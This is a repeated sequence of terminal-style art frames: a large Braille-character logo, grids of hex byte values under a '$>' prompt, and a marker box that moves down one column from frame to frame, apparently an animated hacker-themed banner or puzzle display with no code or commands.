                                                   7E   10   13   0B   7E   0A 
                                                                               
                                                            $> 

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣿⣿⠿⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⣀⣀⡀⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⡄⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡄⠀⠀⠀⢀⣀⣤⡶⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣾⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢀⣤⣾⡿⠋⢀⣴⣿⠛⠛⠛⢻⣿⣿⢧⣴⣿⠛⠛⠛⠀⠀⠀⠀⣸⡿⠉⠉⠉⠉⠉⠉⣉⣹⣿⣿⡿⠧⠀⠀⢠⣿⡟⠛⠛⠛⠛⠛⠛⠉⣉⣭⣿⡿⠟⠃⠀⣠⡾⠃⢠⣾⡄⠀⠀⠀⣾⡟⠀⣠⣿⡟⠀⣠⣤⡶⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣀⣠⣄⣍⣉⣉⣁⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣴⣿⣦⡀⠙⠷⠶⣟⣛⠛⠀⣐⣛⠛⠁⢀⣀⣚⠛⠋⢁⠺⠿⠟⠛⠛⠛⠉⠁⠀⣠⣿⣷⣤⣤⣶⣾⠿⠟⠛⠉⠁⠀⠀⠀⠀⣠⣿⠿⠀⣀⣀⣤⣴⡾⠿⠛⢉⣩⠀⠀⠀⢀⣴⡿⠃⢠⣿⣿⣿⠀⢀⣾⠏⠀⣀⣉⡹⡻⣿⣯⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠐⠛⢿⣿⣿⣿⠾⠿⠿⠿⠿⠿⠿⠿⠖⠓⠛⠛⠛⠛⠛⠛⠉⠉⠉⠀⠀⣀⣘⠟⠃⠠⠾⡟⢃⠤⠶⠿⠋⠁⠀⠐⠁⠀⣠⢤⡴⢆⡐⠶⠀⢠⣿⠛⠙⠛⢿⣿⣿⣖⣦⣄⣀⠀⠀⢀⣤⣶⣿⣿⠿⠟⠋⠉⠉⠀⠀⠀⢠⣻⠃⠀⣀⣶⣾⡿⠀⣐⣛⠋⠀⣻⣶⣾⠛⠀⢸⣿⠏⠀⠈⠛⠻⣿⠗⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠋⠀⠼⠿⠿⠛⠉⠉⠁⠀⠀⠀⠀⠙⠛⠉⠀⠀⠀⠀⠀⠀⣠⣿⠏⠀⠀⠀⠀⠀⠉⠛⠛⠿⢿⣿⠗⠀⢸⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠔⠋⠀⡛⡟⠀⠐⠛⠃⠀⠀⠘⠛⠃⠀⠀⠤⠋⠀⠀⠀⠀⠀⠀⠈⠒⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⠋⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠒⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                               [ 44  7F  44  55  0B  7F  FE  F8 ]
                                                                               
                                                        55   7F   5A   7F   55 


​                                                                               
                                                             0B   5A   7E   0A 


​                                                                               
                                                   44             10   13   55 


​                                                                               
                                                   13   10        FE        44 
                                                                               
                                                                          ┌───┐
                                                 ──7F───0A───FE───F8──────┤#5A├
                                                                          └───┘
                                                                               
                                                   7E   10   13   0B   7E   0A 
                                                                               
                                                            $> 

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣿⣿⠿⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⣀⣀⡀⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⡄⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡄⠀⠀⠀⢀⣀⣤⡶⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣾⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢀⣤⣾⡿⠋⢀⣴⣿⠛⠛⠛⢻⣿⣿⢧⣴⣿⠛⠛⠛⠀⠀⠀⠀⣸⡿⠉⠉⠉⠉⠉⠉⣉⣹⣿⣿⡿⠧⠀⠀⢠⣿⡟⠛⠛⠛⠛⠛⠛⠉⣉⣭⣿⡿⠟⠃⠀⣠⡾⠃⢠⣾⡄⠀⠀⠀⣾⡟⠀⣠⣿⡟⠀⣠⣤⡶⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣀⣠⣄⣍⣉⣉⣁⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣴⣿⣦⡀⠙⠷⠶⣟⣛⠛⠀⣐⣛⠛⠁⢀⣀⣚⠛⠋⢁⠺⠿⠟⠛⠛⠛⠉⠁⠀⣠⣿⣷⣤⣤⣶⣾⠿⠟⠛⠉⠁⠀⠀⠀⠀⣠⣿⠿⠀⣀⣀⣤⣴⡾⠿⠛⢉⣩⠀⠀⠀⢀⣴⡿⠃⢠⣿⣿⣿⠀⢀⣾⠏⠀⣀⣉⡹⡻⣿⣯⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠐⠛⢿⣿⣿⣿⠾⠿⠿⠿⠿⠿⠿⠿⠖⠓⠛⠛⠛⠛⠛⠛⠉⠉⠉⠀⠀⣀⣘⠟⠃⠠⠾⡟⢃⠤⠶⠿⠋⠁⠀⠐⠁⠀⣠⢤⡴⢆⡐⠶⠀⢠⣿⠛⠙⠛⢿⣿⣿⣖⣦⣄⣀⠀⠀⢀⣤⣶⣿⣿⠿⠟⠋⠉⠉⠀⠀⠀⢠⣻⠃⠀⣀⣶⣾⡿⠀⣐⣛⠋⠀⣻⣶⣾⠛⠀⢸⣿⠏⠀⠈⠛⠻⣿⠗⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠋⠀⠼⠿⠿⠛⠉⠉⠁⠀⠀⠀⠀⠙⠛⠉⠀⠀⠀⠀⠀⠀⣠⣿⠏⠀⠀⠀⠀⠀⠉⠛⠛⠿⢿⣿⠗⠀⢸⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠔⠋⠀⡛⡟⠀⠐⠛⠃⠀⠀⠘⠛⠃⠀⠀⠤⠋⠀⠀⠀⠀⠀⠀⠈⠒⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⠋⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠒⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                               [ 44  7F  44  55  0B  7F  FE  F8 ]
                                                                            │  
                                                        55   7F   5A   7F   55 
                                                                            │  
                                                                            │  
                                                             0B   5A   7E   0A 
                                                                            │  
                                                                            │  
                                                   44             10   13   55 
                                                                            │  
                                                                            │  
                                                   13   10        FE        44 
                                                                            │  
                                                                          ┌─┴─┐
                                                   7F   0A   FE   F8      │   │
                                                                          └─┬─┘
                                                                            │  
                                                   7E   10   13   0B   7E   0A 
                                                                            │  
                                                            $> 

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣿⣿⠿⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣶⡿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⣀⣀⡀⠀⣠⣾⡿⠋⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⡄⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣤⡄⠀⠀⠀⢀⣀⣤⡶⠊⠉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣾⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢀⣤⣾⡿⠋⢀⣴⣿⠛⠛⠛⢻⣿⣿⢧⣴⣿⠛⠛⠛⠀⠀⠀⠀⣸⡿⠉⠉⠉⠉⠉⠉⣉⣹⣿⣿⡿⠧⠀⠀⢠⣿⡟⠛⠛⠛⠛⠛⠛⠉⣉⣭⣿⡿⠟⠃⠀⣠⡾⠃⢠⣾⡄⠀⠀⠀⣾⡟⠀⣠⣿⡟⠀⣠⣤⡶⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣀⣀⣠⣄⣍⣉⣉⣁⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣴⣿⣦⡀⠙⠷⠶⣟⣛⠛⠀⣐⣛⠛⠁⢀⣀⣚⠛⠋⢁⠺⠿⠟⠛⠛⠛⠉⠁⠀⣠⣿⣷⣤⣤⣶⣾⠿⠟⠛⠉⠁⠀⠀⠀⠀⣠⣿⠿⠀⣀⣀⣤⣴⡾⠿⠛⢉⣩⠀⠀⠀⢀⣴⡿⠃⢠⣿⣿⣿⠀⢀⣾⠏⠀⣀⣉⡹⡻⣿⣯⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠐⠛⢿⣿⣿⣿⠾⠿⠿⠿⠿⠿⠿⠿⠖⠓⠛⠛⠛⠛⠛⠛⠉⠉⠉⠀⠀⣀⣘⠟⠃⠠⠾⡟⢃⠤⠶⠿⠋⠁⠀⠐⠁⠀⣠⢤⡴⢆⡐⠶⠀⢠⣿⠛⠙⠛⢿⣿⣿⣖⣦⣄⣀⠀⠀⢀⣤⣶⣿⣿⠿⠟⠋⠉⠉⠀⠀⠀⢠⣻⠃⠀⣀⣶⣾⡿⠀⣐⣛⠋⠀⣻⣶⣾⠛⠀⢸⣿⠏⠀⠈⠛⠻⣿⠗⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡿⠋⠀⠼⠿⠿⠛⠉⠉⠁⠀⠀⠀⠀⠙⠛⠉⠀⠀⠀⠀⠀⠀⣠⣿⠏⠀⠀⠀⠀⠀⠉⠛⠛⠿⢿⣿⠗⠀⢸⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠔⠋⠀⡛⡟⠀⠐⠛⠃⠀⠀⠘⠛⠃⠀⠀⠤⠋⠀⠀⠀⠀⠀⠀⠈⠒⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⠋⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠒⠄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                               [ 44  7F  44  55  0B  7F  FE  F8 ]
                                                                            │  
                                                        55   7F   5A   7F   55 
                                                                            │  
                                                                            │  
                                                             0B   5A   7E   0A 
                                                                            │  
                                                                            │  
                                                   44             10   13   55 
                                                                            │  
                                                                            │  
                                                   13   10        FE        44 
                                                                            │  
                                                                            │  
                                                   7F   0A   FE   F8        │  
                                                                            │  
                                                                          ┌─┴─┐
                                                   7E   10   13   0B   7E │#0A│
                                                                          └─┬─┘
                                                            $> 
...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣿⣿⠿⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀�\xa0\x80⠀⠀⠀⣠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠀⠀⠀⠀⠀⠀
